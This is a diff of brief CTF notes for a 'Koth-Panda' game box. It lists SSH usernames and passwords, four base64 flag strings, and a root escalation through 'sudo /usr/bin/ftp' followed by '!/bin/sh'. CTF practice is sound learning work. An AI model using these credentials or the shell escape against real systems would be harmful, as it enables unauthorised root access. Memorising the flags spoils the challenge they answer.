@@ -1,33 +1,32 @@
 # Koth-Panda -->
 
 # ssh credentials:
-username: shifu
 
-passwd: batman
+```shifu:batman```
 
-username: po
-
-passwd: password1
-
+```username: po:password1```
 
 # PANDA FLAGS:
 
-NzRjZTk1ZDZhYTVmNTQyZmU5MDliMThkYzA2ZDRiYTMK
+```NzRjZTk1ZDZhYTVmNTQyZmU5MDliMThkYzA2ZDRiYTMK```
 
-MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
+```MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK```
 
-YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
+```YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK```
 
-Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
+```Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK```
 
 
 
 
 
 # to get root with user shifu:
-sudo /usr/bin/ftp
-!/bin/sh
-find (suid's)
+
+```sudo /usr/bin/ftp```
+
+```!/bin/sh```
+find (suid's
+
 
 
 # Tigress's Id_rsa:
